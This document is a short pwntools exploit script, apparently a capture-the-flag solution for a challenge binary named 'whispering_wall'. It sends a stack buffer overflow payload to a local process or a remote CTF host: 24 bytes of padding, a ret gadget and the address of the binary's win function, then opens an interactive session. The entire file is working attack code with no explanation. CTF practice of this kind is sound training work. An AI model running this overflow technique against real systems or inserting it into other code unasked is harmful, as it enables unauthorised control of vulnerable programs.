#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF('./whispering_wall', checksec = False)

def conn():
    if args.LOCAL:
        r = process([elf.path])
        if args.GDB:
            gdb.attach(r)
    else: 
        r = remote('offsec.m0lecon.it',13517)
    return r

def main():
    p = conn()
    OFFSET = 24 #found with cyclic
    ret_addr = 0x000000000040101a

    payload = b'A'*OFFSET + p64(ret_addr) + p64(elf.sym.win)
    p.recvuntil(b'whisper:\n')
    p.sendline(payload)

    p.interactive()

if __name__ == "__main__":
    main()